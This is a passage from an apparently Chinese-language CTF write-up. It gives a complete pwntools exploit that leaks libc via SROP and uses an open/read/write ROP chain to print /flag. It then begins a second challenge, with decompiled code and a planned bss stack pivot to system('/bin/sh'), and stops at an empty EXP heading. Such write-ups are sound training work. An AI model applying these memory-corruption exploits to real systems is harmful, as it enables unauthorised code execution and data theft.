
```python
base = puts_addr - libc.symbols["puts"]
open = libc.symbols["open"] + base
read = libc.symbols["read"] + base
write = libc.symbols["write"] + base
rdi = 0x000000000010f78b + base
rsi = 0x0000000000110a7d + base
payload2 = b'a'*0x78 + p64(rdi) + p64(bss_addr - 0x68) + p64(rsi) + p64(0) + p64(open)
payload2 += p64(rdi) + p64(3) + p64(rsi) + p64(bss_addr + 0x100) + p64(pop_rdx_rbp_ret) + p64(0x30)*2 + p64(read)
payload2 += p64(rdi) + p64(1) + p64(rsi) + p64(bss_addr + 0x100) + p64(pop_rdx_rbp_ret) + p64(0x30)*2 + p64(write)
io.send(payload2)
flag = io.recv().decode()
log.info(f"flag-->{flag}")
io.interactive()
```

我们根据泄露的`puts`地址，计算`libc`基址在程序中的偏移，同样也可以在`libc`中找我们需要的gadget，比如设置`rdi`和`rsi`，之后就是利用`open`函数以只读模式打开`/flag`文件，`read`函数把`/flag`文件的内容写入到`bss_addr + 0x100`位置，接着利用`write`函数把`bss_addr + 0x100`的内容输出到终端拿到`flag`。

![](https://bbs.kanxue.com/upload/attach/202602/1002337_E48C88VWJZGHQSX.png)

可以看到`open`函数完后返回了文件描述符3，接着将`flag`写入`0x404440`的位置

![](https://bbs.kanxue.com/upload/attach/202602/1002337_7ZW4HYQVCEDH7XJ.png)

执行完后查看有没有成功写入

![](https://bbs.kanxue.com/upload/attach/202602/1002337_8E8JRY4GAJK5WMA.png)

再接着就是把`flag`打印到终端了

![](https://bbs.kanxue.com/upload/attach/202602/1002337_F8F5NU6629XH3Q9.png)

成功输出`flag`

![](https://bbs.kanxue.com/upload/attach/202602/1002337_43M7YCQGU4MT4A9.png)

### EXP

```python
from pwn import *
context(os="linux", arch="amd64", log_level="debug")
#io = remote("172.29.160.1", 2924)
io = process("./pwn")
libc = ELF("./libc.so.6")
elf = ELF("./pwn")
#gdb.attach(io,"b *0x4012D4")
syscall_addr = 0x4012fa
ret_addr = 0x40101a
main_addr = 0x00000000004012B8
pop_rdx_rbp_ret = 0x4012fc
read_plt = elf.plt["read"]
bss_addr = 0x0000000000404040 + 0x300
payload = b'a'*0x70 + p64(bss_addr) + p64(main_addr)
io.recvuntil(b"hey hey what are you doing here?\n")
io.send(b'a' * 0x50)
io.recvuntil(b"I say STOP doing this!\n")
#pause()
io.send(payload)
frame = SigreturnFrame()
frame.rdi = elf.got["puts"]
frame.rip = elf.plt["puts"]
frame.rsp = bss_addr - 0x70
frame.rbp = bss_addr + 0x200
payload1 = b'a'*0x70
payload1 += p64(bss_addr)
payload1 += p64(pop_rdx_rbp_ret)
payload1 += p64(15)
payload1 += p64(bss_addr)
payload1 += p64(read_plt)
payload1 += p64(syscall_addr)
payload1 += bytes(frame)
io.send(payload1)
#pause()
io.send(p64(main_addr) + b'/flag\x00\x00')
puts_addr = u64(io.recvuntil(b'\n',drop=True).ljust(8,b'\x00'))
log.info(f"puts_addr ->{hex(puts_addr)}")
base = puts_addr - libc.symbols["puts"]
open = libc.symbols["open"] + base
read = libc.symbols["read"] + base
write = libc.symbols["write"] + base
rdi = 0x000000000010f78b + base
rsi = 0x0000000000110a7d + base
payload2 = b'a'*0x78 + p64(rdi) + p64(bss_addr - 0x68) + p64(rsi) + p64(0) + p64(open)
payload2 += p64(rdi) + p64(3) + p64(rsi) + p64(bss_addr + 0x100) + p64(pop_rdx_rbp_ret) + p64(0x30)*2 + p64(read)
payload2 += p64(rdi) + p64(1) + p64(rsi) + p64(bss_addr + 0x100) + p64(pop_rdx_rbp_ret) + p64(0x30)*2 + p64(write)
io.send(payload2)
flag = io.recv().decode()
log.info(f"flag-->{flag}")
io.interactive()
```

## [XSCTF]xswlhhhstack

先查看保护

![](https://bbs.kanxue.com/upload/attach/202602/1002337_99BMG9XVJMZYMJR.png)

可以看到`main`函数里只能溢出到返回地址，溢出长度受限考虑栈迁移，因为没有开启`pie`，我们可以考虑迁移到`bss`段

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
    char buf[80];
    // [rsp+0h] [rbp-50h] BYREF
    init(argc, argv, envp);
    puts("Xswlhhh!Use stack hijacking on him!");
    read(0, buf, 0x60uLL);
    return 0;
}
.text:00000000004011DB ; __unwind {
.text:00000000004011DB        endbr64
.text:00000000004011DF        push    rbp
.text:00000000004011E0        mov     rbp, rsp
.text:00000000004011E3        sub     rsp, 50h
.text:00000000004011E7        mov     eax, 0
.text:00000000004011EC        call    init
.text:00000000004011F1        lea     rax, s          ; "Xswlhhh!Use stack hijacking on him!"
.text:00000000004011F8        mov     rdi, rax        ; s
.text:00000000004011FB        call    _puts
.text:0000000000401200        lea     rax, [rbp+buf]
.text:0000000000401204        mov     edx, 60h ; '`'
.text:0000000000401209        mov     rsi, rax        ; buf
.text:000000000040120C        mov     edi, 0          ; fd
.text:0000000000401211        call    _read
.text:0000000000401216        mov     eax, 0
.text:000000000040121B        leave
.text:000000000040121C        retn
.text:000000000040121C ; }
.text:000000000040121C main            endp
```

程序里有个`gift`函数，还给了`pop rbp;ret`的gadget，我们可以控制`rbp`内容，还有`pop rdi;ret`可以控制函数的第一个参数

```asm
.text:000000000040121D gift            proc near
.text:000000000040121D ; __unwind {
.text:000000000040121D        endbr64
.text:0000000000401221        push    rbp
.text:0000000000401222        mov     rbp, rsp
.text:0000000000401225        pop     rdi
.text:0000000000401226        retn
.text:0000000000401226 gift            endp
.text:0000000000401226
.text:0000000000401226 ; -------------------------------
.text:0000000000401227        align 8
.text:0000000000401228        pop     rbp
.text:0000000000401229        retn
.text:0000000000401229 ; }
.text:0000000000401229 starts at 40121D
```

这道题的主要思路是通过把栈迁移到`bss`段，在`bss`段上设置`ROP`链泄露`libc`基址，最终调用`system("/bin/sh")`

### EXP
